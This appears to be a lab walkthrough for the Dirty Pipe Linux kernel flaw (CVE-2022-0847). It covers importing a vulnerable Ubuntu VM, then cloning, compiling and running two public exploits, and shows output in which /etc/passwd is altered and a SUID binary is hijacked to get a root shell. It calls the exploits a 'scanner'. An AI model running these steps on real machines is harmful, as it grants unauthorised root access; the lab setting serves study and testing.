# CVE-2022-0847-DirtyPipe-Exploits Scan

# Step-1: Prepare Target System:
⦁	Download “Exploit-Target-Ubuntu-20-4.ova”  
⦁	Open VMware workstation and go to “File>Open”:  
 
⦁	Browse and select “Exploit-Target-Ubuntu-20-4.ova” file: 
  
⦁	Set a name for VM and select the location to store it and click on Import:
 
⦁	Importing OVA:
 
⦁	Finally, the VM is ready to play and start it:
 
⦁	Now login with User: exploit password: exploit
 
⦁	Now the system is ready:
 
# Step-2: Install dependency and Check kernel version for vulnerability:
⦁	Start the VM and login with User: exploit Password: exploit
⦁	Open Terminal and check the kernel and OS version:
```
uname -r
5.11.0-27-generic

cat /etc/os-release 

NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
```
⦁	You will need to have GCC and Git installed:
```sudo apt-get install gcc git -y```
#  Step-3: Download and Compile CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully install git, gcc now clone the exploits scanner from GitHub:
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
⦁	Check is it download or not:
```
ls -la

drwxrwxr-x  3 exploit exploit 4096 Mar 23 01:49 CVE-2022-0847-DirtyPipe-Exploits
```
⦁	Change the directory:
``
cd CVE-2022-0847-DirtyPipe-Exploits
``
⦁	After installing GCC, you can run the 'compile.sh" script as follows:
```
chmod +x compile.sh
./compile.sh
```
# Step-4: Run CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully complied you’re able to run exploit-1:
```
./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

whoami
root
```
⦁	To exit from this console type exit and press enter twice:
exit
```
$
⦁	Run exploit-2:
./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

whoami
root

exit
```

## Affected versions
Linux kernel versions newer than 5.8 are affected.
So far the vulnerability has been patched in the following Linux kernel versions:
**5.16.11
5.15.25
5.10.102**
You can learn more about the vulnerability here: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847
